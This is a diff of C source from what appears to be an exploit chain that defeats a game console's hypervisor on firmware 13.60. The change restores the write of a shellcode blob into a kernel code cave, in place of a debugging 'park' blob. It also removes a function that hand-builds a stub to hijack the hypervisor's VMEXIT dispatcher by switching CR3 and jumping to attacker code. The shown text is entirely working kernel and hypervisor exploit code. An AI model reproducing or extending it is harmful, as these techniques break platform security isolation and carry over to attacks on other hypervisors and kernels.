@@ -383,19 +383,7 @@ static int stage_hv_boot(void) {
   /* Identity map + the shellcode_hv blob it will jump into. */
   stage_identity_map();
 
-  /* BISECTION: a park blob instead of shellcode_hv.
-   *
-   * Four bytes - cli; hlt; jmp -3 - so the one core the takeover takes out stops
-   * dead and touches nothing else. If the console still powers off with this in the
-   * cave, the fault is in the redirect itself: the stub, the CR3 switch or the
-   * VMMCALL. shellcode_hv then has nothing to do with it and rewriting it is a
-   * waste of time. If the console survives, shellcode_hv is where it dies. */
-  {
-    static const uint8_t park_blob[4] = {0xfa, 0xf4, 0xeb, 0xfd};
-    kwrite(pa_to_dmap(cave_hv_code), (void *)park_blob, sizeof(park_blob));
-  }
-  if (0)
-    kwrite(pa_to_dmap(cave_hv_code), shellcode_hv_bin, shellcode_hv_bin_len);
+  kwrite(pa_to_dmap(cave_hv_code), shellcode_hv_bin, shellcode_hv_bin_len);
 
   /* Build the linux_info the HV shellcode reads from cave_linux_info, with the
    * kernel/initrd relocated to identity-mapped physical addresses. */
@@ -543,7 +531,6 @@ int khook_selftest(void) {
   return pass ? 0 : -1;
 }
 
-
 /*
  * Verify the staging hv_boot depends on, without switching CR3.
  *
@@ -614,65 +601,6 @@ static void verify_hv_staging(void) {
     notify("13.60: [staging] WARNING: high alias maps wrong physical region\n");
   if (code0 == 0)
     notify("13.60: [staging] WARNING: cave_hv_code looks empty\n");
-}
-
-/* Write the VMEXIT redirect stub ourselves, and read it back.
- *
- * shellcode_hv is only reached if every VMMCALL lands in the hypervisor's VMEXIT
- * dispatcher, and the takeover blob gets there by overwriting the first 25 bytes of
- * it with a stub that loads the cave's CR3 and jumps to the cave's code. That write
- * happens inside the blob, in kernel context, on the guest's page tables, and
- * nothing ever checks whether it took.
- *
- * Hypervisor memory is not reliably writable here: break_hv has to clear NP_ENABLE
- * on every VMCB before the hypervisor's memory can be read at all, so a write that
- * silently does nothing is a real possibility and would look exactly like what the
- * log shows - a takeover that arms, fires, and leaves the machine dead with no
- * further output, fifteen times out of fifteen.
- *
- * Doing it from here means the result can be logged, because the payload's log file
- * still works after the resume.
- *
- * Layout is the blob's: movabs rax, CAVE_HV_PAGING ; mov cr3, rax ; movabs rax,
- * CAVE_HV_CODE ; jmp rax. */
-static void stage_vmexit_stub(uint64_t dmap) {
-  uint8_t stub[25];
-  uint8_t back[25];
-  uint64_t vme = dmap + env_offset.HV_HANDLE_VMEXIT_PA;
-  int same = 1;
-
-  stub[0] = 0x48;
-  stub[1] = 0xb8;
-  *(uint64_t *)(void *)&stub[2] = cave_hv_paging;
-  stub[10] = 0x0f;
-  stub[11] = 0x22;
-  stub[12] = 0xd8;
-  stub[13] = 0x48;
-  stub[14] = 0xb8;
-  *(uint64_t *)(void *)&stub[15] = cave_hv_code;
-  stub[23] = 0xff;
-  stub[24] = 0xe0;
-
-  /* What is there now, before we touch it. The 13.60 dispatcher starts
-   * "mov edx,0xcfc ; in eax,dx", so cfc should appear in these bytes. */
-  kread(vme, back, sizeof(back));
-  notify("13.60: vmexit stub: before = %02x %02x %02x %02x %02x %02x %02x %02x"
-         " (want cfc somewhere)\n",
-         back[0], back[1], back[2], back[3], back[4], back[5], back[6], back[7]);
-
-  kwrite(vme, stub, sizeof(stub));
-
-  memset(back, 0, sizeof(back));
-  kread(vme, back, sizeof(back));
-  for (size_t i = 0; i < sizeof(stub); i++) {
-    if (back[i] != stub[i])
-      same = 0;
-  }
-
-  notify("13.60: vmexit stub: after  = %02x %02x %02x %02x %02x %02x %02x %02x"
-         " -> %s\n",
-         back[0], back[1], back[2], back[3], back[4], back[5], back[6], back[7],
-         same ? "WRITE LANDED" : "WRITE DID NOT LAND");
 }
 
 static int install_resume_hook(uint64_t cave_addr) {
@@ -1003,7 +931,6 @@ int hv_defeat_1360(void) {
   uint64_t cave_addr;
   uint64_t kernel_pmap;
   int ret;
-
 
   if (check_offsets()) {
     notify("13.60: high-FW vector is not ready (offsets incomplete).\n");
